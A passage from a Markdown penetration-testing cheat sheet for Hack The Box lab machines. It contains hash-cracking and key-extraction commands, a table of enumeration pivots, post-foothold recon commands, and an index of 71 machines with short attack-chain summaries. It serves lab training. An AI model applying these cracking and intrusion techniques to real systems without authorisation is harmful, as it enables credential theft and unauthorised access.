john --wordlist=/usr/share/wordlists/rockyou.txt archive.hash
openssl pkcs12 -in certificate.pfx -nocerts -nodes -out client.key
openssl pkcs12 -in certificate.pfx -clcerts -nokeys -out client.crt
puttygen key.ppk -O private-openssh -o id_rsa
sqlite3 database.sqlite '.tables'
mdb-tables -1 database.mdb
```

- [ ] Strip only literal Python 3 `b'...'` wrappers if `pfx2john` emits them.
- [ ] Preserve Unicode exactly in recovered passphrases.
- [ ] Identify hash type before choosing a cracking mode.
- [ ] Check documents for text, metadata, and predictable names.

Sources: [Timelapse](./htb-writeups/Timelapse.md), [Keeper](./htb-writeups/Keeper.md), [Puppy](./htb-writeups/Puppy.md), [Access](./htb-writeups/Access.md), [Authority](./htb-writeups/Authority.md), [Intelligence](./htb-writeups/Intelligence.md), [Administrator](./htb-writeups/Administrator.md).

## 6. Failure means pivot, not stop

| Observation | Next checks |
|---|---|
| SMB null succeeds but shares look empty | Run RPC/SID; test guest separately; re-run after any credential. |
| Guest fails | Says nothing about null, named low privilege, Kerberos, or local auth. |
| LDAP anonymous subtree is empty | Query RootDSE, try LDAPS/authenticated LDAP, RPC, or MSSQL SID discovery. |
| MSSQL domain login fails | Confirm SQL-local and use `--local-auth`; reverse the test for domain accounts. |
| Password works but WinRM fails | Check Remote Management Users/logon rights, hostname, TLS, and Kerberos. |
| Kerberos returns skew | Sync time, verify DC DNS/hostname, retry. |
| Web root is default page | Enumerate certificate names, vhosts, alternate ports, and protocols. |
| Upload returns error | Check side effects, renamed path, worker processing, and expected 5xx. |
| SQLi scanner finds nothing | Test manually, second request, WebSocket, DBMS, encoding, and level. |
| LFI works but no execution | Read source/config, recover credentials, locate a separate sink. |
| CVE PoC fails | Confirm build/module/architecture, filename/export, request path, and patch state. |
| TCP exposes little | Run UDP; inspect DNS, TFTP, IKE, SNMP, QUIC, IPv6, and RPC. |

## 7. Foothold obtained — capture before moving on

Linux landing:

```bash
id
hostname
pwd
uname -a
ip -br addr
ip route
ss -lntup
```

Windows/PowerShell landing:

```powershell
whoami /all
$env:COMPUTERNAME
[Environment]::Is64BitOperatingSystem
Get-Location
Get-NetIPConfiguration
route print
Get-NetTCPConnection -State Listen | Sort-Object LocalPort
```

- [ ] Record identity, integrity/effective privileges, groups, shell type, cwd, architecture, and host/container boundary.
- [ ] Save the successful request/command and prerequisites.
- [ ] Stabilize shell and establish a safe transfer path.
- [ ] Re-enumerate locally before escalating. Continue with [Lateral-Movement.md](./Lateral-Movement.md), then [Privilege-Escalation.md](./Privilege-Escalation.md).

## 8. Machine coverage and source index

All 71 available audited writeups are represented. `Notes` and `PDF` are local-workspace citations. The official PDFs are intentionally absent from the private text-only GitHub mirror.

| Machine | Foothold recall anchor | Sources |
|---|---|---|
| Markup | defaults → XXE → SSH key | [Notes](./htb-writeups/Markup.md) · [PDF](./htb-writeups/Markup.pdf) |
| Busqueda | Searchor Python `eval` injection | [Notes](./htb-writeups/Busqueda.md) · [PDF](./htb-writeups/Busqueda.pdf) |
| Sau | Request Baskets SSRF → loopback Maltrail | [Notes](./htb-writeups/Sau.md) · [PDF](./htb-writeups/Sau.pdf) |
| Help | GraphQL/HelpDeskZ SQLi or timed upload | [Notes](./htb-writeups/Help.md) · [PDF](./htb-writeups/Help.pdf) |
| Broker | ActiveMQ CVE-2023-46604/OpenWire | [Notes](./htb-writeups/Broker.md) · [PDF](./htb-writeups/Broker.pdf) |
| Soccer | upload → Nginx vhost → WebSocket SQLi | [Notes](./htb-writeups/Soccer.md) · [PDF](./htb-writeups/Soccer.pdf) |
| Keeper | support-ticket credential reuse | [Notes](./htb-writeups/Keeper.md) · [PDF](./htb-writeups/Keeper.pdf) |
| Networked | PHP backup → PNG/polyglot upload | [Notes](./htb-writeups/Networked.md) · [PDF](./htb-writeups/Networked.pdf) |
| BoardLight | vhost → Dolibarr uppercase-PHP bypass | [Notes](./htb-writeups/BoardLight.md) · [PDF](./htb-writeups/BoardLight.pdf) |
| CozyHosting | Actuator session → `${IFS}` injection | [Notes](./htb-writeups/CozyHosting.md) · [PDF](./htb-writeups/CozyHosting.pdf) |
| Editorial | preview SSRF → internal API | [Notes](./htb-writeups/Editorial.md) · [PDF](./htb-writeups/Editorial.pdf) |
| Pandora | SNMP args → tunneled Pandora SQLi/AJAX | [Notes](./htb-writeups/Pandora.md) · [PDF](./htb-writeups/Pandora.pdf) |
| LinkVortex | Git → Ghost symlink import/file read | [Notes](./htb-writeups/LinkVortex.md) · [PDF](./htb-writeups/LinkVortex.pdf) |
| Dog | exposed Backdrop Git → module installer | [Notes](./htb-writeups/Dog.md) · [PDF](./htb-writeups/Dog.pdf) |
| Usage | reset SQLi → avatar filename bypass | [Notes](./htb-writeups/Usage.md) · [PDF](./htb-writeups/Usage.pdf) |
| Titanic | compose path → booking read → SQLite | [Notes](./htb-writeups/Titanic.md) · [PDF](./htb-writeups/Titanic.pdf) |
| Outbound | Roundcube auth → deserialization | [Notes](./htb-writeups/Outbound.md) · [PDF](./htb-writeups/Outbound.pdf) |
| Editor | XWiki Groovy RCE | [Notes](./htb-writeups/Editor.md) · [PDF](./htb-writeups/Editor.pdf) |
| Expressway | TFTP config + IKE PSK | [Notes](./htb-writeups/Expressway.md) · [PDF](./htb-writeups/Expressway.pdf) |
| ServMon | anonymous FTP clues → NSClient++ | [Notes](./htb-writeups/ServMon.md) · [PDF](./htb-writeups/ServMon.pdf) |
| Support | LDAP/SMB + reversible support-tool secret | [Notes](./htb-writeups/Support.md) · [PDF](./htb-writeups/Support.pdf) |
| Access | FTP → Access DB/archive → Telnet | [Notes](./htb-writeups/Access.md) · [PDF](./htb-writeups/Access.pdf) |
| Heist | Cisco config hash → RPC users → WinRM | [Notes](./htb-writeups/Heist.md) · [PDF](./htb-writeups/Heist.pdf) |
| Active | anonymous Replication → GPP `cpassword` | [Notes](./htb-writeups/Active.md) · [PDF](./htb-writeups/Active.pdf) |
| Forest | LDAP users → AS-REP → WinRM | [Notes](./htb-writeups/Forest.md) · [PDF](./htb-writeups/Forest.pdf) |
| Sauna | website names → AS-REP | [Notes](./htb-writeups/Sauna.md) · [PDF](./htb-writeups/Sauna.pdf) |
| Return | printer configuration credential | [Notes](./htb-writeups/Return.md) · [PDF](./htb-writeups/Return.pdf) |
| Timelapse | open SMB → ZIP/PFX → cert WinRM | [Notes](./htb-writeups/Timelapse.md) · [PDF](./htb-writeups/Timelapse.pdf) |
| Cicada | guest SMB/RID → HR default → spray | [Notes](./htb-writeups/Cicada.md) · [PDF](./htb-writeups/Cicada.pdf) |
| Fluffy | writable SMB/coercion → NTLM capture | [Notes](./htb-writeups/Fluffy.md) · [PDF](./htb-writeups/Fluffy.pdf) |
| Eighteen | MSSQL local auth + RID brute | [Notes](./htb-writeups/Eighteen.md) · [PDF](./htb-writeups/Eighteen.pdf) |
| Escape | MSSQL coercion → captured service auth | [Notes](./htb-writeups/Escape.md) · [PDF](./htb-writeups/Escape.pdf) |
| Monteverde | anonymous LDAP/null SMB → `azure.xml` | [Notes](./htb-writeups/Monteverde.md) · [PDF](./htb-writeups/Monteverde.pdf) |
| Cascade | LDAP custom attrs → TightVNC/config | [Notes](./htb-writeups/Cascade.md) · [PDF](./htb-writeups/Cascade.pdf) |
| TheFrizz | Gibbon write → DB hash → Kerberos SSH | [Notes](./htb-writeups/TheFrizz.md) · [PDF](./htb-writeups/TheFrizz.pdf) |
| Puppy | shares/BloodHound → KeePass | [Notes](./htb-writeups/Puppy.md) · [PDF](./htb-writeups/Puppy.pdf) |
| Voleur | SMB/config → roast/ticket workflow | [Notes](./htb-writeups/Voleur.md) · [PDF](./htb-writeups/Voleur.pdf) |
| Signed | MSSQL SID/RID → CVE-2025-33073 | [Notes](./htb-writeups/Signed.md) · [PDF](./htb-writeups/Signed.pdf) |
| TombWatcher | BloodHound → roast/gMSA | [Notes](./htb-writeups/TombWatcher.md) · [PDF](./htb-writeups/TombWatcher.pdf) |
| UpDown | vhost → `.git`/`.htaccess` → PHAR | [Notes](./htb-writeups/UpDown.md) · [PDF](./htb-writeups/UpDown.pdf) |
| Magic | SQL login bypass → image/PHP confusion | [Notes](./htb-writeups/Magic.md) · [PDF](./htb-writeups/Magic.pdf) |
| Monitored | SNMP command line → Nagios API/SQLi | [Notes](./htb-writeups/Monitored.md) · [PDF](./htb-writeups/Monitored.pdf) |
| Builder | Jenkins CLI arbitrary file read | [Notes](./htb-writeups/Builder.md) · [PDF](./htb-writeups/Builder.pdf) |
| Browsed | Chrome extension → internal app/action | [Notes](./htb-writeups/Browsed.md) · [PDF](./htb-writeups/Browsed.pdf) |
| StreamIO | vhost SQLi → admin LFI/RFI | [Notes](./htb-writeups/StreamIO.md) · [PDF](./htb-writeups/StreamIO.pdf) |
| Intelligence | predictable PDFs/metadata → spray | [Notes](./htb-writeups/Intelligence.md) · [PDF](./htb-writeups/Intelligence.pdf) |
| Jeeves | hidden Jenkins → script console | [Notes](./htb-writeups/Jeeves.md) · [PDF](./htb-writeups/Jeeves.pdf) |
| Manager | null RID → username=password MSSQL | [Notes](./htb-writeups/Manager.md) · [PDF](./htb-writeups/Manager.pdf) |
| Aero | ThemeBleed exact DLL/export/build | [Notes](./htb-writeups/Aero.md) · [PDF](./htb-writeups/Aero.pdf) |
| Administrator | ACL resets → FTP password safe | [Notes](./htb-writeups/Administrator.md) · [PDF](./htb-writeups/Administrator.pdf) |
| Certified | ownership/ACL → shadow credential | [Notes](./htb-writeups/Certified.md) · [PDF](./htb-writeups/Certified.pdf) |
| Mailing | traversal → mail config → client CVE | [Notes](./htb-writeups/Mailing.md) · [PDF](./htb-writeups/Mailing.pdf) |
| Intentions | second-order SQLi → Imagick/MSL | [Notes](./htb-writeups/Intentions.md) · [PDF](./htb-writeups/Intentions.pdf) |
| Flight | vhosts/LFI → NTLM capture → spray | [Notes](./htb-writeups/Flight.md) · [PDF](./htb-writeups/Flight.pdf) |
| Blackfield | guest SMB → AS-REP → LSASS artifact | [Notes](./htb-writeups/Blackfield.md) · [PDF](./htb-writeups/Blackfield.pdf) |
| EscapeTwo | repaired share document → MSSQL/spray | [Notes](./htb-writeups/EscapeTwo.md) · [PDF](./htb-writeups/EscapeTwo.pdf) |
| Mentor | SNMP → API blind RCE → container | [Notes](./htb-writeups/Mentor.md) · [PDF](./htb-writeups/Mentor.pdf) |
| Outdated | SMB document → Follina/mail | [Notes](./htb-writeups/Outdated.md) · [PDF](./htb-writeups/Outdated.pdf) |
| Atom | writable share → Electron updater | [Notes](./htb-writeups/Atom.md) · [PDF](./htb-writeups/Atom.pdf) |
| Authority | SMB Ansible → Vault → PWM LDAP | [Notes](./htb-writeups/Authority.md) · [PDF](./htb-writeups/Authority.pdf) |
| Clicker | NFS source → SQLi → PHP export | [Notes](./htb-writeups/Clicker.md) · [PDF](./htb-writeups/Clicker.pdf) |
| Cerberus | Icinga traversal → module-path RCE | [Notes](./htb-writeups/Cerberus.md) · [PDF](./htb-writeups/Cerberus.pdf) |
| Cereal | Git JWT key → XSS → localhost deserialize | [Notes](./htb-writeups/Cereal.md) · [PDF](./htb-writeups/Cereal.pdf) |
| Quick | HTTP/3 portal → ESI execution | [Notes](./htb-writeups/Quick.md) · [PDF](./htb-writeups/Quick.pdf) |
| Vintage | Kerberos-only → gMSA/ACL chain | [Notes](./htb-writeups/Vintage.md) · [PDF](./htb-writeups/Vintage.pdf) |
| RustyKey | Timeroast/GPO/ACL → WinRM | [Notes](./htb-writeups/RustyKey.md) · [PDF](./htb-writeups/RustyKey.pdf) |
| DarkZero | cross-domain MSSQL linked server | [Notes](./htb-writeups/DarkZero.md) · [PDF](./htb-writeups/DarkZero.pdf) |
| Absolute | image metadata → AS-REP → binary secret | [Notes](./htb-writeups/Absolute.md) · [PDF](./htb-writeups/Absolute.pdf) |
| APT | RPC/IPv6 → backup/registry credential | [Notes](./htb-writeups/APT.md) · [PDF](./htb-writeups/APT.pdf) |
| Multimaster | UTF-16 WAF bypass → MSSQL SID/RID | [Notes](./htb-writeups/Multimaster.md) · [PDF](./htb-writeups/Multimaster.pdf) |
| Rebound | RID → AS-REP → roast → ACL chain | [Notes](./htb-writeups/Rebound.md) · [PDF](./htb-writeups/Rebound.pdf) |
